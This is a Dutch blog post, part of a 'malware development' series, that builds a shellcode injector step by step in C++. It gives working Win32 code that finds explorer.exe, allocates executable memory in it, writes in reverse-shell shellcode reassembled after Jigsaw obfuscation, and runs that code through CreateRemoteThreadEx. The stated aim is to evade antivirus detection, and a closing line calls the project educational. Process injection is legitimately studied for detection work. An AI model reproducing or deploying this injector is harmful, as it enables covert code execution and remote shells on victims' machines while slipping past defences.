Welkom bij deel 2 van mijn blogserie, "Mijn reis door malware development". In dit deel ga ik een eigen stukje malware ontwikkelen met behulp van **shellcode injection**. 

---

### Overzicht van de techniek

Shellcode injection is een klassieke techniek in malwareontwikkeling. Het proces bestaat uit de volgende stappen:

1. **Een handle verkrijgen naar het doelproces** door een bestaand proces te openen.
2. **Geheugen reserveren in het doelproces** met de juiste permissies.
3. **Shellcode reconstrueren en schrijven naar het toegewezen geheugen** in het proces.
4. **Een nieuwe thread starten** in het doelproces om de shellcode uit te voeren.

In deze blogpost maken we gebruik van de **Win32 API**. Hoewel dit in eerste instantie intimiderend kan lijken, biedt het een krachtige set tools voor malwareontwikkeling.

---

### Obfuscatie van shellcode met Jigsaw

Bij het genereren van shellcode om een TCP-reverse shell te creëren, gebruiken we de tool **Jigsaw** voor obfuscatie. Deze tool splitst de shellcode in kleine stukjes en husselt ze door elkaar. De oorspronkelijke positie van elk stukje wordt opgeslagen in een aparte array. Dankzij de functie `reconstruct_shellcode` kan de shellcode vervolgens in de juiste volgorde worden hersteld voordat deze wordt geïnjecteerd. Dit verhoogt de kans om antivirusdetectie te omzeilen.

**Codefragment voor reconstructie:**

```c++
void reconstruct_shellcode() {
    for (int idx = 0; idx < sizeof(positions) / sizeof(positions[0]); idx++) {
        position = positions[idx];
        calc_payload[position] = jigsaw[idx];
    }
}
```

Hierdoor wordt de oorspronkelijke shellcode in de juiste volgorde herbouwd, klaar om te worden geïnjecteerd.

---

### Gebruikte API-calls

Voor de implementatie maken we gebruik van de volgende belangrijke functies uit de Win32 API:

- **OpenProcess**: Voor het verkrijgen van een handle naar een doelproces.
- **VirtualAllocEx**: Voor het reserveren van geheugen in het doelproces.
- **WriteProcessMemory**: Om de shellcode naar de toegewezen geheugenbuffer te schrijven.
- **CreateRemoteThreadEx**: Om een nieuwe thread te starten die de shellcode uitvoert.
- **CreateToolhelp32Snapshot**: Voor het maken van een snapshot van actieve processen.
- **Process32First/Process32Next**: Voor het doorlopen van processen in de snapshot om het juiste proces te vinden.

Laten we elke stap nu gedetailleerd bespreken.

---

### Stap 1: Een handle verkrijgen met OpenProcess

De eerste stap in het proces is het verkrijgen van toegang tot het doelproces. Dit doen we met de functie `OpenProcess`. Met een geldig handle kunnen we het geheugen van het doelproces manipuleren, wat essentieel is voor onze injectie.

Wanneer we `OpenProcess` aanroepen, specificeren we drie parameters:

- `dwDesiredAccess` bepaalt welke rechten we nodig hebben. In ons geval kiezen we `PROCESS_ALL_ACCESS` om volledige controle over het doelproces te verkrijgen.
- `bInheritHandle` bepaalt of child-processen dit handle mogen erven. Hier zetten we dit op `FALSE` omdat we alleen in het huidige proces willen werken.
- `dwProcessId` is de unieke ID van het doelproces. Dit stelt ons in staat precies dat proces te openen dat we willen manipuleren.

Wanneer `OpenProcess` succesvol is, retourneert het een geldig handle. Als de functie faalt, retourneert het `NULL`, en kunnen we met `GetLastError` de foutcode achterhalen om te begrijpen wat er misging.

```c++
void openHandleToProcess(DWORD processID) {
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    printf("%s got a handle to the process!\n\---0x%p\n", k, hProcess);
    if (hProcess == NULL) {
        printf("%s couldn't get a handle to the process (%ld), error: %ld", e, processID, GetLastError());
    }
}
```

In dit fragment zien we hoe de handle wordt geopend en hoe we loggen of deze stap succesvol was. Met dit handle hebben we nu de mogelijkheid om het geheugen van het doelproces te bewerken.

---

### Stap 2: Processen doorzoeken met CreateToolhelp32Snapshot

Nadat we weten welk proces we willen targeten, moeten we het specifieke proces identificeren in de lijst van actieve processen. Hiervoor gebruiken we `CreateToolhelp32Snapshot`, een handige functie waarmee we een momentopname maken van alle actieve processen.

Wanneer de snapshot eenmaal is gemaakt, doorlopen we de processen met behulp van `Process32First` om het eerste proces op te halen, en `Process32Next` om door de lijst te itereren. Bij elk proces vergelijken we de naam met de naam van ons doelproces. Zodra we een match vinden, slaan we de process ID (PID) op en gaan we verder met de injectie.

```C++
void injectIntoProcess(const wchar_t* processName) {
    reconstruct_shellcode();

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("%s failed to create snapshot, error: %ld\n", e, GetLastError());
        return;
    }

    if (Process32First(snapshot, &pe32)) {
        do {
            if (wcscmp(pe32.szExeFile, processName) == 0) {
                openHandleToProcess(pe32.th32ProcessID);
                if (hProcess != NULL) {
                    allocateMemory();
                    if (rBuffer != NULL) {
                        writeMemory();
                        createRemoteThread();
                    }
                    cleanup();
                }
                break;
            }
        } while (Process32Next(snapshot, &pe32));
    } else {
        printf("%s failed to retrieve process list, error: %ld\n", e, GetLastError());
    }
    CloseHandle(snapshot);
}
```

Hier gebruiken we een snapshot van de actieve processen om het juiste proces te vinden. Zodra een match is gevonden, wordt de injectieprocedure gestart.

---

### Stap 3: Geheugen toewijzen met VirtualAllocEx

Nadat we toegang hebben verkregen tot het doelproces, moeten we een geheugenbuffer toewijzen waarin de shellcode wordt geplaatst. Dit doen we met `VirtualAllocEx`. Deze functie reserveert en wijst geheugen toe binnen de adresruimte van het doelproces, wat cruciaal is om onze shellcode later uit te voeren.

De belangrijkste parameters van `VirtualAllocEx` zijn:

- `hProcess`: Dit is de handle naar het doelproces waarin we geheugen willen reserveren.
- `lpAddress`: Het startadres van de buffer. We gebruiken hier `NULL`, zodat Windows automatisch een geschikt adres kiest.
- `dwSize`: De grootte van de buffer. Dit komt overeen met de grootte van onze shellcode.
- `flProtect`: De beschermingsinstellingen voor het geheugen. We kiezen hier voor `PAGE_EXECUTE_READWRITE` zodat het geheugen kan worden gelezen, beschreven en uitgevoerd.

```c++
void allocateMemory() {
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(calc_payload), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(calc_payload));
}
```

Dit fragment reserveert een buffer waarin de shellcode wordt opgeslagen. Dankzij de juiste permissies kan de code worden uitgevoerd zodra deze is geladen.

---

### Stap 4: Schrijven van shellcode met WriteProcessMemory

Met de buffer klaar voor gebruik is het nu tijd om de shellcode naar het doelproces te schrijven. Dit doen we met `WriteProcessMemory`. Deze functie kopieert gegevens van ons eigen proces naar de eerder gereserveerde buffer in het doelproces.

```c++
void writeMemory() {
    WriteProcessMemory(hProcess, rBuffer, calc_payload, sizeof(calc_payload), NULL);
    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(calc_payload));
}
```

Hiermee wordt de shellcode effectief geladen in het geheugen van het doelproces. Dit is een cruciale stap, omdat het ons in staat stelt om onze payload uit te voeren.

---

### Stap 5: Thread aanmaken met CreateRemoteThreadEx

De volgende stap is het starten van een nieuwe thread die de shellcode uitvoert. Hiervoor gebruiken we `CreateRemoteThreadEx`. Deze functie start een thread in het doelproces, waarbij het startadres wordt ingesteld op de locatie van onze shellcode.

```c++
void createRemoteThread() {
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
    if (hThread == NULL) {
        printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
    } else {
        printf("%s got a handle to the thread (%ld)\n\---0x%p\n", k, TID, hThread);
        waitForThread();
    }
}
```

Met deze functie wordt de shellcode uitgevoerd binnen het doelproces.

---

### Stap 6: Wachten op threaduitvoering en opruimen

Na het starten van de thread is het belangrijk om te wachten tot de uitvoering is voltooid en vervolgens alle gebruikte resources netjes op te ruimen. Dit voorkomt geheugenlekken en andere problemen.

```c++
void waitForThread() {
    printf("%s waiting for thread to finish\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing\n", k);
}

void cleanup() {
    printf("%s cleaning up\n", i);
    if (hThread != NULL) CloseHandle(hThread);
    if (hProcess != NULL) CloseHandle(hProcess);
    printf("%s finished!\n", k);
}
```

Door de handles correct te sluiten, zorgen we voor een veilige en efficiënte afronding van het injectieproces.

---

### Wat gebeurt er in de `main` functie?

De `main` functie is het startpunt van het programma en fungeert als coördinator. Hier wordt een instantie van de klasse `ProcessInjector` aangemaakt. Vervolgens wordt de methode `injectIntoProcess` aangeroepen met de naam van het doelproces, in dit geval `L"explorer.exe"`. Dit proces wordt gekozen omdat het vaak actief is en voldoende permissies heeft voor de injectie.

```c++
int main(int argc, char* argv[]) {
    ProcessInjector injector;
    injector.injectIntoProcess(L"explorer.exe");
    return EXIT_SUCCESS;
}
```

De `main` functie doet het volgende:

1. **Initialisatie van de injector**: Een object van `ProcessInjector` wordt gemaakt, dat de logica voor het injecteren bevat.
2. **Aanroepen van** `injectIntoProcess`: Dit start het proces van het injecteren van shellcode in het opgegeven doelproces.
3. **Terugkeerwaarde**: De functie eindigt met `EXIT_SUCCESS`, wat aangeeft dat het programma succesvol is uitgevoerd.

De `main` functie is eenvoudig gehouden om de nadruk te leggen op de gestructureerde aanpak binnen de `ProcessInjector` klasse. Dit maakt de code overzichtelijk en modulair.

---

### Resultaat en conclusies

Met de bovenstaande stappen hebben we een eenvoudige maar functionele malware ontwikkeld die gebruikmaakt van shellcode injection. Door gebruik te maken van `CreateToolhelp32Snapshot` hebben we automatisch processen geïdentificeerd en het juiste proces geselecteerd. Deze techniek toont de kracht van het manipuleren van procesgeheugen via de Win32 API. In toekomstige delen van deze blogserie zullen we meer geavanceerde technieken verkennen, zoals encryptie van shellcode en anti-detectie-methoden.

Let op: dit project is uitsluitend bedoeld voor educatieve doeleinden en mag alleen worden uitgevoerd in een gecontroleerde omgeving.